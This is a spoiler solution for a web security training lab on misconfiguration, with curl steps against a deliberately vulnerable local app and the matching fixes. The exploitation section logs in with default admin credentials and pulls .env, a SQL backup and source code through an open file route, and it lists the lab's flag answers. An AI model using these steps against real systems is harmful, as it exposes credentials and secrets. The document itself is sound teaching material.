🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)

# A02 — Solution (spoilers!)

Try the lab yourself first, using the hints from the [README](./README.md).

## Exploitation on vulnerable (port 8011)

```bash
# 1. Default account. In the browser: the staff form at http://127.0.0.1:8011/admin
curl -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}' http://127.0.0.1:8011/login
# → FLAG{a02_default_credentials}
# The same login in the browser opens the staff dashboard with the flag.

# 2. The /files route serves any file from the application folder
curl http://127.0.0.1:8011/files/.env          # → FLAG{a02_exposed_env_file}
curl http://127.0.0.1:8011/files/backup.sql    # → FLAG{a02_forgotten_backup}
curl http://127.0.0.1:8011/files/app.py        # → source code, templates, .env

# 3. Verbose error: a stack trace and the application configuration
curl "http://127.0.0.1:8011/menu/abc"
# → 500 with "traceback" and "config" (DB_URL, SECRET_KEY = FLAG{a02_verbose_errors})
# In the browser the same request shows an error page with the trace and the config.

# 4. Headers
curl -i http://127.0.0.1:8011/
# present: X-Powered-By (Flask/Python versions), Server: Werkzeug/...
# missing: X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, Referrer-Policy
```

## What is wrong

| № | Mistake | Why it is dangerous |
|---|---------|---------------------|
| 1 | Password `admin` / `admin` | Anyone who knows the usual pairs can log in to the back office |
| 2 | `/files/<name>` serves the application root | Leaks `.env`, backups and source code |
| 3 | The error handler shows a stack trace and the configuration | Reveals the application structure and secrets |
| 4 | No security headers and a version banner is present | Makes attacks (clickjacking, MIME sniffing) and reconnaissance easier |

## Fixes (fixed, port 8012)

- The password comes from `ADMIN_PASSWORD`; if it is not set, a random one is generated
- The `/files` route is removed; only the `static/` folder is served
- A single error handler: the user gets a neutral page or `error_id`, details go only to the log
- The headers `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Referrer-Policy` are set, and there is no `X-Powered-By`
- A non-numeric dish id is handled as an ordinary input error (`400`) instead of crashing

Check on fixed:

```bash
curl http://127.0.0.1:8012/files/.env           # 404
curl "http://127.0.0.1:8012/menu/abc"           # 400, no stack trace
curl -i http://127.0.0.1:8012/                  # security headers in place
curl -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}' http://127.0.0.1:8012/login   # 401
# the site itself still works: / , /menu , /menu/4 , /admin
```

## What else to remember
- In real systems secrets are not written to logs: in the lab the password is printed to the log only for convenience.
- Configuration must be checked automatically and on every release, not once.
- The site being convenient for visitors and the site being configured safely are two different tasks — do both.
